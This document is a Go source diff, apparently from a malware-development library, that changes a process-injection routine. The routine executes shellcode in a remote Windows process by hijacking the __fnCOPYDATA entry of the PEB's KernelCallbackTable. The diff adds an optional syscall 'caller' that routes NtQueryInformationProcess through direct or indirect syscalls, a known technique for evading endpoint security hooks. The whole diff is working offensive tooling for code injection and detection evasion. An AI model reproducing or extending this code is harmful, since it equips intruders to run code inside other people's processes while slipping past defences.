@@ -7,6 +7,7 @@ import (
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
 )
 
@@ -45,7 +46,12 @@ type copyDataStruct struct {
 // KernelCallbackExec executes shellcode in a remote process by hijacking
 // the __fnCOPYDATA callback in the PEB's KernelCallbackTable.
 // After execution, the original callback pointer is restored.
-func KernelCallbackExec(pid int, shellcode []byte) error {
+//
+// `caller` is the optional *wsyscall.Caller used to route the
+// NtQueryInformationProcess call (indirect / direct syscall, etc.).
+// Pass nil to call ntdll!NtQueryInformationProcess directly via the
+// WinAPI proc table.
+func KernelCallbackExec(pid int, shellcode []byte, caller *wsyscall.Caller) error {
 	if pid <= 0 {
 		return fmt.Errorf("valid target process required")
 	}
@@ -66,13 +72,10 @@ func KernelCallbackExec(pid int, shellcode []byte) error {
 	// 1. Get PEB address via NtQueryInformationProcess(ProcessBasicInformation = 0).
 	var pbi processBasicInfo
 	var retLen uint32
-	status, _, _ := api.ProcNtQueryInformationProcess.Call(
-		uintptr(hProcess),
-		0, // ProcessBasicInformation
-		uintptr(unsafe.Pointer(&pbi)),
-		unsafe.Sizeof(pbi),
-		uintptr(unsafe.Pointer(&retLen)),
-	)
+	status, err := queryProcessBasicInfo(caller, uintptr(hProcess), &pbi, &retLen)
+	if err != nil {
+		return fmt.Errorf("failed to query process information: %w", err)
+	}
 	if status != 0 {
 		return fmt.Errorf("failed to query process information: NTSTATUS 0x%X", status)
 	}
@@ -207,4 +210,29 @@ func findWindowByPID(pid uint32) windows.HWND {
 	)
 
 	return result.hwnd
+}
+
+// queryProcessBasicInfo routes NtQueryInformationProcess(ProcessBasicInformation)
+// through `caller` when non-nil, falling back to the WinAPI proc table
+// when caller is nil. Returns NTSTATUS as the first value (0 == success)
+// to keep the caller's existing dispatch shape.
+func queryProcessBasicInfo(caller *wsyscall.Caller, hProcess uintptr, pbi *processBasicInfo, retLen *uint32) (uintptr, error) {
+	if caller != nil {
+		status, err := caller.Call("NtQueryInformationProcess",
+			hProcess,
+			0, // ProcessBasicInformation
+			uintptr(unsafe.Pointer(pbi)),
+			unsafe.Sizeof(*pbi),
+			uintptr(unsafe.Pointer(retLen)),
+		)
+		return status, err
+	}
+	status, _, _ := api.ProcNtQueryInformationProcess.Call(
+		hProcess,
+		0,
+		uintptr(unsafe.Pointer(pbi)),
+		unsafe.Sizeof(*pbi),
+		uintptr(unsafe.Pointer(retLen)),
+	)
+	return status, nil
 }
